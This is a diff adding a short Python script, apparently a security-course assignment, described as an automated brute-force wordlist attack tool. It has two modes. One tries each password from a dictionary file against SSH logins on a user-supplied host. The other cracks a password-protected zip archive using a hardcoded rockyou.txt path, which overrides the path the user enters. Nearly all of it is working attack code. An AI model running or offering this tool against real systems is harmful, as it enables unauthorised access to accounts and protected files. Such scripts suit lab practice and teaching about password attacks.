@@ -1,0 +1,67 @@
+#!/usr/bin/env python3
+##  /\__/\
+#  (=^ .^=)
+#   (")(")__/  
+##
+# Script:                 Ops 401 18
+# Author:                 Kimberly Dills
+# Date of last revision:  10/28/2020
+# Description of purpose: Automated Brute Force Wordlist Attack Tool 3 of 3
+import smtplib
+import itertools
+import sys
+import time
+from pexpect import pxssh
+import zipfile
+
+def split(user, ipAddress, txtFile ):
+    filepath =open(txtFile)
+    for i in filepath.readlines():
+        secret=i.strip("\n")
+        print(secret)
+        s=pxssh.pxssh()
+        try:
+            s.login(ipAddress, user, secret)
+            print("The password is  "+ secret)
+            break    
+        except pxssh.ExceptionPxssh as e:
+            print ("pxssh failed to login")
+            print(e)
+            time.sleep(1)
+
+def zipSplit(zip_loc, txtFile):
+    txtFile="/home/osboxes/Downloads/rockyou.txt"
+    zip_file=zip_loc
+    zip_file=zipfile.ZipFile(zip_file)
+    filepath=open(txtFile)
+    for i in filepath.readlines():
+        secret=i.strip()
+        print(secret)
+        try:
+            zip_file.extractall(pwd=bytes(secret,"utf-8"))
+        except:
+            continue    
+        else:
+            print("The password is"+ secret)
+            exit(0)
+            
+    print("Password not found")
+
+def main():
+    print("Please enter a Mode")
+    modes=input("Press 1 for bruteforce SSH, Press 2 for bruteforce zipfile     ")
+    if modes == "1":
+        print("You have chosen Mode 1 to split into an SSH connection.")    
+        user=input("What is the username?")
+        ipAddress=input("What is the ip address?")
+        txtFile=input("What is the folder path to your dictionary file?")
+        split(user, ipAddress, txtFile)  
+    elif modes == "2":
+        print("You have selected to split into a zipfile")
+        zip_loc=input("Where is the zipfile located (include zipfile)?")
+        txtFile=input("What is the folder path to your dictionary file?")
+        zipSplit(zip_loc,txtFile)
+    else:
+        print("You can return to code")
+        main()
+main()
